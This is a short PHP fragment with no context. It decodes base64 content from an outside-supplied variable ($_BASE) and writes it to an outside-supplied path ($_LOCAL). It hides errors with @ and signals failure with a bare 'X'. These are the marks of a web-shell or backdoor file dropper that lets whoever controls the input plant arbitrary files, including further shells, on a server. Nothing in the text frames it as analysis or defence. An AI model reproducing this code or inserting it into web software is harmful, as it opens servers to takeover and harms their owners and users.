$cat = $_LOCAL;
$base = $_BASE;
$data = base64_decode($base);
$file = @fopen($cat, 'w');
if (@fwrite($file, $data)===FALSE){echo "X";}
@fclose($file);